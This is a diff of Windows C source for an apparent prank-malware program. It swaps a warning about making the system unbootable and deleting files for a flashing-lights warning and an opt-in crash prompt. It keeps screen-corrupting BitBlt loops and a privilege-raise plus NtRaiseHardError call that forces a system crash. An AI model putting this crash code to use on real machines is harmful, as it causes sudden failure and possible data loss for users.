@@ -25,23 +25,20 @@ DWORD WINAPI audio(LPVOID lpParam) {
     ExitThread(0);
 }
 
-/*DWORD WINAPI Music(LPVOID lpParam) {
-    mciSendString("open \"rick.mp3\" type mpegvideo alias mp3", NULL, 0, NULL);
-    mciSendString("play mp3", NULL, 0, NULL);
-    MessageBoxW(NULL, L"Get rick rolled", L"NEVER GONNA GIVE YOU UP", MB_YESNO | MB_ICONEXCLAMATION);
-    mciSendString("stop mp3", NULL, 0, NULL);
-}*/
-
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, INT nCmdShow) {
-    if (MessageBoxW(NULL, L"This program is malware; a program that will render your computer unusable and corrupt your data should you run it. \nIf you understand this and wish to continue, press Yes. If you just found this file accidentally and do not want to harm your computer or your files, press No and this program will not execute.", L"WARNING", MB_YESNO | MB_ICONEXCLAMATION) != IDYES || MessageBoxW(NULL, L"THIS IS YOUR LAST WARNING. THE CREATOR (kevlu8) IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED TO YOUR SYSTEM. BY PRESSING THE \"YES\" BUTTON TO THIS MESSAGE BOX, YOUR SYSTEM WILL BE RENDERED UNBOOTABLE AND YOUR PERSONAL FILES WILL BE DELETED. IF YOU UNDERSTAND THIS AND WISH TO EXECUTE THIS MALICIOUS PROGRAM, CLICK YES. OTHERWISE, THIS IS YOUR LAST CHANCE TO BACK OUT BEFORE YOUR FILES ARE GONE.", L"LAST CHANCE BEFORE YOUR COMPUTER IS GONE", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
+    if (MessageBoxW(NULL, L"This program contains rapid flashing lights and loud audio. Are you sure you want to continue?", L"WARNING", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
     {
         ExitProcess(0);
     }
 
-    BOOL playmusic = TRUE;
+    BOOL crash = FALSE;
+
+    if (MessageBoxW(NULL, L"Would you like this program to crash your computer or no?", L"Crash?", MB_YESNO | MB_ICONEXCLAMATION) == IDYES) {
+        crash = TRUE;
+    }
 
     functionarray payloads[] = {
-        leakram,
+        NULL,
         p1,
         p2,
         p3
@@ -169,7 +166,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
     fori(1000) {
         i += 5;
-        BitBlt(desk, sin(i) * 5, cos(i) * i, sw, h, desk, rand() % i * 50, rand() % i * 50, SRCCOPY);
+        BitBlt(desk, sin(i) * 5, cos(i) * i, sw, h, desk, rand() % i * 50, rand() % i * 50, 0x00D80745);
     } 
 
     fori(50) {
@@ -186,10 +183,12 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     CloseHandle(hAudio);
 
     //crash
-    BOOLEAN bOld2;
-    ULONG ulResponse;
-    RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
-    NtRaiseHardError(0xC0000350, NULL, NULL, NULL, 6, &ulResponse);
-    FreeLibrary(ntdll);
+    if (crash) {
+        BOOLEAN bOld2;
+        ULONG ulResponse;
+        RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
+        NtRaiseHardError(0xC0000350, NULL, NULL, NULL, 6, &ulResponse);
+        FreeLibrary(ntdll);
+    }
     return 0;
 }
